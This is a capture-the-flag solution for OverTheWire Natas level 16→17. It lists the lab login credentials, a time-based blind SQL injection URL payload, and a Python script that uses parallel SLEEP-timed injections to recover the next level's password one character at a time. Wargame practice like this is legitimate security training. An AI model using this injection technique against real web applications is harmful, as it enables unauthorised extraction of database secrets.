# Natas Level 16 → Level 17
- Username: natas17
- URL:      http://natas17.natas.labs.overthewire.org
- Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```sql
?username=natas16%22+and+password+LIKE+BINARY+%22%A%+and+sleep(20)
```

```python
import string
import urllib.request
import urllib.parse
import time
from multiprocessing import Pool

url = "http://natas17.natas.labs.overthewire.org/index.php?debug=1"
headers = {
    "Authorization": (
        "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="
    ),
    "Host": "natas17.natas.labs.overthewire.org",
}
table =\
    string.digits +\
    string.ascii_uppercase +\
    string.ascii_lowercase
username = (
    'natas18" AND '
    'IF(HEX(SUBSTRING(password, %d, 1))%sHEX("%s"), SLEEP(30), null);#'
)


def check_password(pos, compar, char):
    time_start = time.time()
    post_dict = {
        "username": username % (pos, compar, char)
    }
    post_data = urllib.parse.urlencode(post_dict).encode('ascii')
    req = urllib.request.Request(url, post_data, headers)
    with urllib.request.urlopen(req, timeout=60):
        return (time.time() - time_start) > 30


def inject_password(pos):
    for char in table:
        if check_password(pos, '=', char):
            return char
    return ""


with Pool(64) as pool:
    print("".join(pool.map(inject_password, range(1, 65))))
```
- Source: https://gist.github.com/hrl/3edf35c657bb970006bc